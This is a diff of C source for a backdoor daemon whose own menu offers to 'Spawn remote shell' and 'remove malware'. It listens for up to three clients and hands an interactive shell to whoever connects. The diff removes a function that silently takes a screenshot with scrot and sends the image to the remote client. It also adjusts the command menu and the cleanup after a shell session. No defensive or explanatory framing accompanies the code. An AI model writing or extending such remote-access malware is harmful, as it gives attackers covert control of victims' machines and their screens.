@@ -68,7 +68,7 @@ static bool	new_client(t_connexion *connexion, t_users *users)
 		}
 		if (users->nb_user >= 3)
 		{
-			puts("Connexion limit reached");
+			send(users->new_socket, "Connexion limit reached\n", 24, 0);
 			close(users->new_socket);
 		}
 		else
@@ -78,7 +78,6 @@ static bool	new_client(t_connexion *connexion, t_users *users)
 				if (connexion->client_socket[users->i] == 0 )
 				{
 					connexion->client_socket[users->i] = users->new_socket;
-					/*tintin->write_log("New client, id : " + std::to_string(i + 1), "\033[1;32mINFO\033[0m");*/
 					break;
 				}
 			}
@@ -112,7 +111,6 @@ static void	spawn_shell(t_users *users, char **envp)
 		waitpid(pid, &status, 0);
 		kill(pid, SIGTERM);
 	}
-	exit(0);
 }
 
 static void	remove_daemon(t_users *users)
@@ -138,51 +136,6 @@ static void	remove_daemon(t_users *users)
 		kill(pid, SIGTERM);
 	}
 	exit(0);
-}
-
-static void	screenshot(t_users *users, char **envp)
-{
-	char		*screen[] = {"/usr/bin/scrot", "/tmp/test1.png", NULL};
-	char		img[4096] = {0};
-	pid_t		pid = 0;
-	int			status;
-	int			fd = 0;
-	struct stat	st;
-	/*size_t		img_size = 0;*/
-	ssize_t		ret_read = 0;
-
-	int ret;
-
-	pid = fork();
-	if (pid == -1)
-		perror("fork failed");
-	else if (pid == 0)
-	{
-		if ((ret = execve(screen[0], screen, envp)) == -1)
-			perror("execve");
-	}
-	else
-	{
-		waitpid(pid, &status, 0);
-		kill(pid, SIGTERM);
-	}
-	fd = open("/tmp/test1.png", O_RDONLY);
-	if (fd == -1)
-		perror("open");
-	if (stat("/tmp/test1.png", &st) == -1)
-		perror("stat");
-	/*img_size = (size_t)st.st_size;*/
-	sprintf(img, "%zu", st.st_size);
-	send(users->sd, &img, strlen(img), 0);
-	char *map = mmap(0, st.st_size, PROT_READ, MAP_SHARED, fd, 0);
-	if (map == MAP_FAILED)
-	{
-		perror("mmap");
-		exit(0);
-	}
-	printf("real size  = %zu\n", st.st_size);
-	send(users->sd, map, (size_t)st.st_size, 0);
-	unlink("/tmp/test1.png");
 }
 
 bool	run_daemon(t_connexion *connexion, char **envp)
@@ -259,9 +212,15 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 						if (!strcmp(buffer, "remove"))
 							remove_daemon(&users);
 						if (!strcmp(buffer, "?"))
-							send(users.sd, "\n'shell'\tSpawn remote shell on 4243\n'screenshot'	take screen\n> ", 63, 0);
+							send(users.sd, "\n'shell'\t\tSpawn remote shell\n'quit'\t\tClose program\n'Remove'\tremove malware\n> ", 77, 0);
 						else if (!strcmp(buffer, "shell"))
+						{
 							spawn_shell(&users, envp);
+							close( users.sd );
+							connexion->client_socket[users.i] = 0;
+							users.key[users.i] = false;
+							users.nb_user--;
+						}
 						else if (strlen(buffer))
 							send(users.sd, "\nCommand not found. Type ? for print all command\n> ", 51, 0);
 					}
